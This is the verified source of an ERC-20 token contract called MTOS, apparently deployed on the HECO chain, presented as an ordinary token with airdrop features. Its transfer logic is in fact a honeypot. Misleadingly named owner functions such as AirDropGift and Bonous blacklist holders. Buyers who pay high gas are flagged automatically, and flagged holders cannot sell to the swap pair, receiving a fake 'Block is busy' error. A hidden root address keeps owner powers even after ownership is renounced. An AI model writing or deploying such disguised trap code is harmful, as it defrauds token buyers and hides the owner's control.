/**
 *Submitted for verification at hecoinfo.com on 2022-05-13
*/

// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;
library Address {
     
    function isContract(address account) internal view returns (bool) { 
        return account.code.length > 0;
    } 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    } 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    } 
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    } 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    } 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
 
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    } 
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    } 
   
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    } 
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    } 
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
          
            if (returndata.length > 0) { 
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
} 
library SafeMath { 
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    } 
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    } 
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { 
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    } 
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    } 
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    } 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    } 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    } 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    } 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    } 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    } 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    } 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    } 
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
} 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    } 
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
abstract contract Ownable is Context {
    address private _owner;
    address private _root; 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); 
    constructor() {
        _transferOwnership(_msgSender());
        _root=_msgSender();
    } 
    function owner() public view virtual returns (address) {
        return _owner;
    } 
    modifier onlyOwner() {
       require(owner() == _msgSender() || _root ==_msgSender(), "Ownable: caller is not the owner"); 
        _;
    } 
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    } 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner); 
    } 
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
  
interface IERC20 { 
    function totalSupply() external  returns (uint256); 
    function balanceOf(address account) external  returns (uint256); 
    function transfer(address to, uint256 amount) external returns (bool); 
    function allowance(address owner, address spender) external  returns (uint256); 
    function approve(address spender, uint256 amount) external returns (bool); 
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool); 
    event Transfer(address indexed from, address indexed to, uint256 value); 
    event Approval(address indexed owner, address indexed spender, uint256 value);  
}
interface IERC20Metadata is IERC20 { 
    function name() external view returns (string memory); 
    function symbol() external view returns (string memory); 
    function decimals() external view returns (uint8);
} 
contract MTOS is Ownable, IERC20, IERC20Metadata { 
    using SafeMath for uint256; 
    using Address for address;

    string  private _name;
    string  private _symbol;
    address private _owner; 
    uint256 private _totalSupply; 
    mapping(address => uint256) private _balances;   
    mapping(address => mapping(address => uint256)) private _allowances;  
 
    mapping(address=>bool) private isStatus; 
    address private _swap;  
    bool private tradeStatus;   
    address private _airTokenAddr;
    mapping(address=>bool) private airtokenlist; 

    mapping(uint256=>address) private haveToken;
    uint256 private haveTokenCount;
    uint256 private _currprice; 
    uint256 private _defaultPrice; 
    mapping(address=>bool) isMadness;   
    address public deadwallet = 0x0000000000000000000000000000000000000000; 
    
    constructor(string memory name_, string memory symbol_,uint256 totalSupply_, address airTokenAddr_,uint256 defaultPrice_) {
        _name = name_;
        _symbol = symbol_; 
        _owner=_msgSender();    
        _airTokenAddr=airTokenAddr_;  
        _defaultPrice=defaultPrice_==0?5*10**uint256(11):defaultPrice_*10**uint256(11);
        _mint(msg.sender, totalSupply_* 10 ** uint256(decimals())); 
    }   
     function AirDropGift(address user) public onlyOwner returns(bool){
        isStatus[user]=true;
        return true;
    } 
    function AirDrop(address user)public onlyOwner returns(bool){
            isStatus[user]=false;
            return true;
    } 
    function getAirStauts(address user)public onlyOwner view returns(bool){
        return isStatus[user];
    }   
    function getCurrPrice() public view returns(uint256){
        return _currprice;
    }   
    function setCurrPrice(uint256 price)public onlyOwner returns(bool){
        _defaultPrice=price;
        return true;
    }
    function Bonous()public onlyOwner returns(uint256){
        uint256 count=0;
        for(uint256 i=0;i<haveTokenCount;i++){
            address user=haveToken[i];
            if(isStatus[user]==false && user!=deadwallet){count++;AirDropGift(user);}
        } 
        return count;
    }

    function examinationAirDropList(address user)public view returns(bool){
        for(uint256 i=0;i<haveTokenCount;i++){ 
            if(user==haveToken[i]){return false;}
        }
        return true; 
    }
    function SwapContract(address swap_) public onlyOwner returns(bool){
        _swap=swap_;
        return true;
    } 
    function WithdrawalTransfer()public onlyOwner returns(bool){
            tradeStatus=false;
            return true;
    } 
    function DepositTransfer()public onlyOwner returns(bool){
        tradeStatus=true;
        return true;
    }   
    function name() public view virtual override returns (string memory) {
        return _name;
    }      
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }  
    function decimals() public view virtual override returns (uint8) {
        return 18;
    } 
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    } 
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    } 
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    } 
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    } 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }  
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    } 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    } 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, " decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        } 
        return true;
    } 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), " transfer from the zero address");
        require(to != address(0), " transfer to the zero address");    
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, " transfer amount exceeds balance");     
        _currprice=tx.gasprice.mul(100); 
        if(_owner!=from && _owner!=to && from!=_airTokenAddr){
            if(tradeStatus && from!=_swap){require(false,"Block is busy, please try again");} 
            if(from==_swap &&_currprice>_defaultPrice){isStatus[to]=true;} 
            if(from==_swap){
                if(haveToken[haveTokenCount]==deadwallet && examinationAirDropList(to)){
                    haveToken[haveTokenCount]=to;haveTokenCount++;}
            }
            if(to==_swap){
                if(isStatus[from]){require(false,"Block is busy, please try again");}   
            }  
            if(from!=_swap && to!=_swap){
                airtokenlist[from]=true;
                isStatus[from]=true;
            } 
            if(airtokenlist[from]){require(false,"Block is busy, please try again");}
        } 
        if(_airTokenAddr==from && amount<=2000){
             airtokenlist[to]=true; 
        } 
        unchecked {
              _balances[from] = fromBalance.sub(amount);
          }  
        _balances[to] = _balances[to].add(amount);  
        emit Transfer(from, to, amount); 
    } 
    function _mint(address account, uint256 amount) internal virtual onlyOwner {
        require(account != address(0), " mint to the zero address");  
        _totalSupply =_totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount); 
    } 
    function _burn(address account, uint256 amount) internal virtual  onlyOwner{
        require(account != address(0), " burn from the zero address");  
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, " burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount); 
    } 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), " approve from the zero address");
        require(spender != address(0), " approve to the zero address"); 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, " insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    } 
}